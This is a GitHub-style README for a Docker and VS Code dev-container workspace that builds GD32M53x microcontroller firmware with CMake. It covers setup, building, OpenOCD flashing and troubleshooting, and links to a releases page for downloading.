# 🚀 gd32m53x-cmake-vscode - Simple tool for building microcontroller projects

[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/releases)

This project provides a ready-to-use workspace for working with GD32M53x microcontrollers. You do not need to install complex compilers or specialized software on your computer. All required tools exist within a pre-built container. This environment enables you to write code, build projects, and prepare firmware for your device using Visual Studio Code.

## 🛠️ System requirements

Before you begin, ensure your computer meets these minimum standards:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 4GB of free disk space.
* Hardware virtualization enabled in your BIOS settings.

You must install two pieces of software to use this environment:

1. **Docker Desktop:** This software runs the container with the development tools.
2. **Visual Studio Code:** This is the editor where you write your code.
3. **WSL (Windows Subsystem for Linux):** This allows your computer to run Linux-based tools seamlessly.

## 📥 Getting the software

You need to access the release page to obtain the necessary files.

[Click here to visit the release page and download the software](https://github.com/Ratty-amphibian231/gd32m53x-cmake-vscode/releases)

Select the most recent version labeled as "Source code" or "Latest" to ensure you have the best experience. Save the file to a folder you can easily locate on your computer.

## ⚙️ Initial setup

Follow these steps to prepare your environment after downloading the files:

1. Extract the downloaded folder to a path without spaces (example: `C:\projects\gd32-workspace`).
2. Open Docker Desktop and wait until the interface shows the status as running.
3. Open Visual Studio Code.
4. Go to the "Extensions" tab on the left sidebar.
5. Search for "Dev Containers" and install the official Microsoft extension.
6. Restart Visual Studio Code.

## 📂 Opening your project

Once you complete the setup, open your files:

1. In Visual Studio Code, select "File" then "Open Folder".
2. Select the folder where you extracted the project files.
3. Visual Studio Code will detect the development container configuration.
4. Click the blue button in the bottom right corner that says "Reopen in Container".
5. Wait for the process to complete. You will see a progress bar in the bottom right. The software downloads the necessary tools automatically.

## 🔨 Building your code

The workspace uses CMake to manage your project. You do not need to run commands manually.

1. Locate the "CMake" tab in your Visual Studio Code sidebar.
2. Select the "Build" icon.
3. The environment compiles your source code. Look for "Build finished" in the output terminal at the bottom of the screen.

## 💡 Troubleshooting common issues

If you encounter problems, check these areas:

* **Docker fails to start:** Ensure you enabled virtualization in your computer's BIOS. Check your task manager to confirm virtualization shows as "Enabled" under the Performance tab.
* **Build errors:** Check your code for syntax issues. The terminal window displays specific errors if a compilation fails.
* **Container window is empty:** Ensure you opened the project folder as a whole. You must have the `.devcontainer` folder visible in your file list.

## 🔌 Connecting hardware

This project supports OpenOCD for programming your GD32M53x chip. Ensure your debugger connects to your computer via USB. When you run your build, the configuration handles the interface automatically.

## 📚 Understanding the project structure

* `.devcontainer`: Contains the instructions to build your isolated work environment.
* `src`: Place your C or C++ source code files here.
* `include`: Store your header files in this directory.
* `CMakeLists.txt`: This file tells CMake how to compile your project. You only need to edit this file if you add new code files to your project.

## 🤝 Project details

This environment targets the Cortex-M33 architecture. It specifically supports the GD32M531 series of microcontrollers. By using a container, this project ensures that your build results stay consistent whether you work on this computer or another. You eliminate the "it works on my machine" problem by keeping the toolchain version fixed.

## 📝 Ongoing updates

The project remains under active maintenance. New releases appear on the download page periodically to include support for updated libraries or patches. If you find a bug, open an issue on the GitHub repository page. Provide the error log from the terminal when reporting problems so others can help you diagnose the issue.